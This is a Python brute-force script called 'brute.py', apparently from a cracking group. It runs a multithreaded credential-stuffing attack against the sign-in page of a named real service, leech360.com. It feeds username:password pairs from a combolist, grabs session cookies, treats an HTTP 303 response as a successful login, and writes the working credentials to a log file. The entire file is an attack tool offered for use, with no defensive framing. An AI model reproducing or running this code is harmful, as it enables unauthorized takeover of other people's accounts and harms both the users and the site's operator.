import requests
import sys
import re
import time
import os
from threading import Thread,Lock
import queue
# from progressbar import Bar, ETA, Percentage, ProgressBar, RotatingMarker

if sys.platform == 'linux-i386' or sys.platform == 'linux' or sys.platform == 'linux2' or sys.platform == 'darwin':
  SysCls = 'clear'
elif sys.platform == 'win32' or sys.platform == 'dos' or sys.platform[0:5] == 'ms-dos':
  SysCls = 'cls'
else:
  SysCls = 'unknown'

log = "status"

url = "https://leech360.com/sign-in.html"
expression = 303

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.32 (KHTML, like Gecko) Chromium/25.0.1349.2 Chrome/25.0.1349.2 Safari/537.32 Epiphany/3.8.2',
}

face = """

                      +----------------------------------------------------------------+
                      |         '||` '||`     ||`        '||                     ||`   |
                      |          ||   ||      ||          ||             ''      ||    |
                      |  '''|.   ||   ||  .|''||  .|''|,  ||''|, '||''|  ||  .|''||    |
                      | .|''+|   ||   ||  |+  ||  |+..||  ||  +|  ||     ||  |+  ||    |
                      | `|..||. .||. .||. `|..||. `|...  .||..|' .||.   .||. `|..||.   |
                      |                                                                |
                      |                                  '||                           |
                      |       .|'', '||''|  '''|.  .|'',  || //`  .|''|, '||''|        |
                      |       |+     ||    .|''+|  |+     |-<>    |+..||  ||           |
                      |       `|..' .||.   `|..||. `|..' .|| \\.   `|...  .||.          |
                      |                                                                |
                      |              http://www.crackerteam.com                        |
                      |              by : ethicalhxr                                   |
                      +----------------------------------------------------------------+
  brute.py version 1.0
  Brute forcing
  Programmmer : ethicalhxr
  Time        : 16-07-2017
  serkan-777[at]hotmail[dot]com
___________________________________________________________________________________________________________________
"""
bot = int(sys.argv[1])

for x in range(1,100):
    try:
        check_file=open(log+str(x)+".log","r+")
        check_file.close()
    except IOError:
        break

file = open(log+str(x)+".log", "a")

def MyFace():
    os.system(SysCls)
    print(face)
    file.write(face)
    time.sleep(1)

def check(rtn):
    if rtn == 3:
        sys.exit(1)
        #return 0
    elif rtn == 4:
        return 1
    else:
        return 0

def session_id():
    try:
        r = requests.get(url, headers=headers, allow_redirects=False)
    except:
        print("\n[!] session_id: Failed to connect")
        sys.exit(0)

    session_id = re.match("SSID=(.*?);", r.headers["set-cookie"])
    session_id = session_id.group(1)

    return session_id


def BruteForce(username,password, i):
    ssid = session_id()
    data = {'username':username,'password':password}
    cookie = {"SSID": ssid, "Max-Age": "7200"}

    try:
        r = requests.post(url, data=data, headers=headers, cookies=cookie, allow_redirects=False)

        # print("\033[11;4\t\tHSTATUS"
        if expression == r.status_code :
            # print("[+] Correct > ", username, ":", password
            return 4
        else:
            # print("\033[20;4H[+] SSID:    ", ssid)
            # print("\033[21;4H[!]        ")
            return 1

    except KeyboardInterrupt:
        print("\n[-] Aborting...\n")
        file.write("\n[-] Aborting...\n")
        return 0

MyFace()
os.system(SysCls)

combolist  = input("Enter Wordlist Name: ")

if(combolist.find(".txt")==-1):
    combolist=combolist+".txt"
os.system(SysCls)

print("[!] Starting attack at %s" % time.strftime("%X"))
print("[!] System Activated for brute forcing...")
print("[!] Please wait until brute forcing finish !\n")
os.system(SysCls)

try:
    preventstrokes = open(combolist, "r", errors='replace')
    combos         = preventstrokes.readlines()
    count          = 0
    while count < len(combos):
        combos[count] = combos[count].strip()
        count += 1
except(IOError): 
    print("\n[-] Error: Check your combolist path\n")
    file.write("\n[-] Error: Check your combolist path\n")
    input("\nPress any key to continue...")
    sys.exit(1)

print("\n[+] Loaded:",len(combos),"combos")
print("[+] BruteForcing...\n")
time.sleep(1)
os.system(SysCls)
q_list = queue.Queue()

def make_this(q_list):
    os.system(SysCls)
    # success = 0
    for i in range(0,len(combos)):
        cmb = q_list.get()
        if(cmb.find(":")!=-1):
            line=cmb.split(':')
            user=line[0]
            password=line[1]
        else:
            continue
        if check(BruteForce(user.replace("\n",""),password.replace("\n",""), i)) == 1:
            # print "\033[12;4H[*] Success login    "
            file.write("%s\n" % (cmb))
            print("Process: %s     " % (i*bot))
            print(cmb, "    ", time.strftime('%H:%M%p %Z on %b %d, %Y'))
            # success = success + 1
        # print("\033[8;4H[!] Process\t\t: %s" % (i*bot))
        # print("\033[9;4H[!] Login Success\t: %s" % success)
        q_list.task_done()

for cmb in combos:
    q_list.put(cmb)

# widgets = ['\033[6;4HProgress: ', Percentage(), ' ', Bar(marker=RotatingMarker()),
#                ' ', ETA()]
# pbar = ProgressBar(widgets=widgets, maxval=10*len(combos)).start()

for i in range(bot):
    t = Thread(target = make_this, args = (q_list,))
    t.daemon = True
    t.start()
    # pbar.update(10*i+1)

q_list.join()
# pbar.finish()

print("Result: Succesfull Operation. \nCreated File : '",log+str(x)+".log '")

input("Press any key to continue...")
